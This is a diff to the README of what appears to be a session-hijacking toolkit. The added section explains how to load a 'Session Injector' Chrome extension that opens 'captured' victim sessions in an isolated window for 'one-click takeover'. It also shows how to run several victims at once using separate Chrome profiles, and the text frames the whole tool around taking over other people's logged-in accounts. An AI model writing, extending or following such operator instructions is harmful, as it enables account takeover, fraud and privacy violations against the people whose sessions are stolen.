@@ -45,6 +45,16 @@ automatically moves to the next free one and prints it.
 The Dashboard (what the end user opens) shows sessions only and works with the
 Session Injector extension for one-click takeover.
 
+## The Session Injector extension
+
+Load `extension/` once via `chrome://extensions` → **Developer mode** → **Load
+unpacked**. It opens a captured session in a **separate, isolated window** so your
+own logins are never overwritten — close the window and the victim session is gone.
+
+Only one victim is live in that window at a time; taking over another replaces it
+cleanly. Need two at once? Use the "Use this profile instead" button, or start a
+second Chrome with its own profile: `chrome --user-data-dir=/tmp/victim2`.
+
 ## Hosting it on a server later
 
 Run with an external bind and a password:
